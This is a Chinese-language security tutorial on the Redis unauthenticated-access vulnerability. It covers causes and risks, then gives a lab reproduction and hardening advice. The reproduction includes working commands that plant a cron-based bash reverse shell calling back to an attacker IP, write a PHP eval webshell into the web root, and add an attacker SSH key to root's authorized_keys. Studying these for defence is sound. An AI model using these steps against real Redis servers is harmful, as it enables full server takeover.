## 1.redis简介

redis是一个 **非常快速** 的，开源的，支持网络，可以基于内存，也可以持久化的日志型， **非关系型**
的键值对数据库。并提供了多种语言的api。有java，c/c++,c#,php，JavaScript，perl，object-c，python，ruby，erlang等客户端，使用方便。

## 2.未授权访问漏洞的成因和危害

### 1.漏洞定义

redis未授权访问漏洞是一个由于redis服务器版本较低，并未设置登陆密码所导致的漏洞，攻击者可以直接利用redis服务器的ip地址和端口完成对redis服务器的远程登陆，对目标服务器完成后续的控制和利用。

### 2.漏洞成因

  * redis为4.x/5.x或以前的版本

  * redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网

  * 没有设置密码认证，可以免密码远程登录redis服务

### 3.漏洞危害

  * 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制

  * 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。

  * 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器

## 3.漏洞复现

### 0.实验准备

实验环境，centos7两台，需要安装如下工具

    
    
    yum -y install gcc gcc-c++ make vim net-tools nc wget
    

使用redis6.2.7版本，攻击机为redisC，靶机为redisS

两台centos关闭selinux安全子系统，iptables和firewalld。

靶机配置redis bind为0.0.0.0

    
    
    #bind默认为 127.0.0.0 ，表示绑定的本机ip，修改为0.0.0.0表示任意主机可以连接
    #这个改动是临时的，没有写入配置文件
    
    127.0.0.1:6379> CONFIG set bind 0.0.0.0
    OK
    

使用攻击机连接靶机，查看info，确认可以无认证登录

    
    
    redis-cli -h 192.168.248.138
    
    192.168.248.138:6379> info
    

### 1.写入计划任务获取反弹shell

攻击机无认证登陆redis后，依次输入如下指令

    
    
    #设置redis库文件的写入目录，/var/spool/cron为linux下存放计划任务的默认目录
    config set dir /var/spool/cron
    
    #设置redis写入库文件的文件名，设置为root
    config set dbfilename root
    
    #将每分钟一次的计划任务写入上面设置的目录中，让靶机主动连接攻击机，实现反弹shell
    #此处的ip为攻击机ip，后面跟上接收反弹shell的端口
    set myshell "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.248.148/7890 0>&1\n\n"
    
    #在靶机查看计划任务
    crontab -l
    
    #在攻击机上开启对应端口，等待一段时间，即可完成反弹shell
    nc -lvvp 7890
    

反弹shell

![image](https://image.3001.net/images/20221130/1669773634_6386b942501ea546c0f42.png!small)

在靶机上有感知，会有收到邮件的提示

可以看到计划任务已经被写入

![image](https://image.3001.net/images/20221130/1669773622_6386b93638ee086f823ec.png!small)

### 2.写入webshell获取http的webshell

在靶机开启httpd服务,并开启redis服务

    
    
    yum -y install httpd
    systemctl start httpd
    
    redis-server
    

在攻击机连接靶机redis

    
    
    redis-cli -h 192.168.248.138
    
    #连上之后如法炮制，输入如下指令
    
    #设置redis库文件写入到/var/www/html目录，该目录是httpd服务的默认路径
    config set dir /var/www/html
    
    #设置写入的文件名，这里需要写入一个php的一句话木马，故而使用php后缀
    config set dbfilename shell.php
    
    #写入内容,此处的abc为连接密码
    set webshell "<?php @eval($_POST[abc]);?>"
    
    #写完之后保存
    save
    
    #这时就可以通过192.168.248.138/shell.php访问到我们写入的php文件
    #然后就可以在任意可以连接该redis的主机上，使用蚁剑连接获取webshell
    #蚁剑-添加数据-url即192.168.248.138/shell.php，密码为abc-右键-虚拟终端-即获得了靶机的远程shell
    

### 3.写入ssh公钥，实现远程免密登录ssh root用户

 **1.攻击机和靶机上开启sshd**

    
    
    systemctl start sshd
    

**2.在靶机创建公钥可写目录**

    
    
    mkdir /root/.ssh
    

**3.清空攻击机上/root/.ssh目录下的文件，方便区分将要生成用于攻击的ssh公钥文件,如果没有该目录，则跳过这一步**

    
    
    rm -rf /root/.ssh/*
    

**4.在攻击机生成ssh密钥对，默认存放在/root/.ssh/目录下，私钥为id_rsa,公钥为id_rsa.pub**

    
    
    ssh-keygen -t rsa
    

![image](https://image.3001.net/images/20221130/1669773605_6386b92502fc78effa7b6.png!small)

**5.在攻击机进入密钥目录，将公钥写入1.txt方便后续操作**

    
    
    cd /root/.ssh
    
    (echo -e "\n\n";cat id_rsa.pub;echo -e "\n\n")>1.txt
    

![image](https://image.3001.net/images/20221130/1669773585_6386b911d93474d9c5f6d.png!small)

**6.在攻击机将1.txt内容带入靶机redis服务器**

此处因为redis6版本的保护模块，无法直接写入，所以我们先在靶机上以关闭保护模式的方式启动redis-server

    
    
    #这一步在靶机shell上操作，也可以在攻击机上获取的反弹shell上操作
    redis-server --protected-mode no
    
    
    
    #这一步在攻击机上操作，将1.txt带入redis服务器
    cat 1.txt | redis-cli -h 192.168.248.138 -x set crack
    

**7.攻击机连接靶机redis服务，将本地的ssh公钥写入靶机，之后即可免密登录ssh**

    
    
    redis-cli -h 192.168.248.138
    
    #如法炮制，此处需要确保靶机上/root/.ssh目录存在
    config set dir /root/.ssh
    config set dbfilename authorized_keys
    save
    exit
    
    #退出之后，攻击机进入/root/.ssh/目录
    #然后即可使用ssh直接登录，不需要输入密码，此处-i是指定私钥文件
    ssh -i id_rsa root@192.168.248.138
    

![image](https://image.3001.net/images/20221130/1669773556_6386b8f4901a84c6717bd.png!small)

## 4.安全加固

  * 升级redis到最新版本（至少在5.x版本以上）

  * 将redis默认端口号6379改为其他端口号

  * 修改redis.conf文件，设置认证密码

  * 利用软硬件防火墙对访问redis服务器的流量进行过滤

  * 开启保护模式 --protected-mode yes

  * 禁止root权限启动redis服务

    
    
    #创建redis用户组
    groupadd redis
    
    #创建redis用户，并且不可登录
    useradd -g redis -s /sbin/nologin -M redis
    
    #配置文件和目录的用户和用户组
    chown -R redis:redis /data/redis/
    chown -R redis:redis /usr/local/redis/
    chown -R redis:redis /data/logs/redis/
    
    #重启redis
    

  * 修改redis.conf文件重命名危险命令，空表示禁用
    
        rename-command FLUSHALL "" 
    
    rename-command CONFIG "" 
    
    rename-command EVAL "" 
    

  * 保证authorized_keys文件的安全

    * 将authorized_keys的权限设置为对拥有者只读，其他用户没有任何权限
        
                chmod 400 ~/.ssh/authorized_keys
        

为保证authorized_keys的权限不会被改掉，还需要设置该文件的immutable位权限

        
                chattr +i \~/.ssh/authorized_keys
        

然而，用户还可以重命名~/.ssh，然后新建新的~/.ssh目录和authorized_keys文件。要避免这种情况，需要设置~./ssh的
immutable位权限

        
                chattr +i ~/.ssh
        

如果需要添加新的公钥，需要移除authorized_keys的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重
新加上immutable位权限 注：chattr设置文件的隐藏属性(+i 让一个文件“不能被删除、改名，设置连接也无法写入或添加据)

